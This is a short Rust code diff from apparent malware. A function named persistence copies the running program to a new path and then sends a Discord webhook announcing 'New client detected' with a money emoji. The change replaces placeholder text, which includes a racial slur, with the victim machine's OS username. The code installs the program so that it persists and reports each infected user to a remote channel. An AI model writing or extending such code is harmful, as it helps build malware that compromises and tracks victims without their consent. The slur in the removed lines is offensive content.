@@ -36,11 +36,9 @@ pub async fn persistence() -> io::Result<()> {
                 copy(current_path, file_path)?;
 
                 discord::send_webhook(
-                    "New client detected",
-                    "Ahoj",
-                    "nigga",
-                    "fjkldshf ksjdhfkjlsd hfkjlhsd jklfhsdjlkhf kjlsd hf",
-                    0xFF5733
+                    ":money_with_wings: New client detected",
+                    format!("OS user: {:?}", env::var("USERNAME")).as_str(),
+                    0x00FF00
                 ).await;
             }
         }
